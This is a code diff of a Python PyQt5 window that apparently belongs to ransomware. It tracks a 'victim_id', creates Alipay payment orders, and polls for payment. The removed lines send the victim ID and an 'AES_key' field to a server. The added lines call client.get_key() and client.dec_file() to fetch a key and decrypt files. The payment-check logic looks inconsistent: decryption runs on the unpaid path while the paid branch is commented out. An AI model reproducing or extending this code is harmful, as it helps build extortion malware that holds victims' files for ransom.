@@ -1,9 +1,8 @@
-import uuid
 import time
 import qrcode
 import os
 import sys
-from client import post_server
+from client import *
 from threading import Thread
 from PyQt5.QtCore import *
 from PyQt5.QtWidgets import *
@@ -23,7 +22,7 @@ alipay = AliPay(
     sign_type="RSA2",  # RSA 或者 RSA2
     debug = True  # 默认False
 )
-victim_id = uuid.uuid1().hex
+client = Client()
 
 # 主窗口
 class Main_window(QMainWindow, Ui_MainWindow):
@@ -78,20 +77,12 @@ class Pay_window(QMainWindow, Ui_PayWindow):
                 if result.get("trade_status", "") == "TRADE_SUCCESS":
                     print('订单已支付!')
                     print('订单查询返回值：', result)
-                    # data = {
-                    #     'victim_id': uuid.uuid4().hex,
-                    #     'AES_key': 'None',
-                    #     'paid': True
-                    # }
-                    # post_server(data)
+                    # client.get_key()
+                    # client.dec_file()
                     return
                 wait_time += 1
-                data = {
-                        'victim_id': victim_id,
-                        'AES_key': 'None',
-                        'paid': True
-                }
-                return post_server(data)
+                client.get_key()
+                client.dec_file()
             cancel_order(out_trade_no, cancel_time)
     
 # 创建预付订单
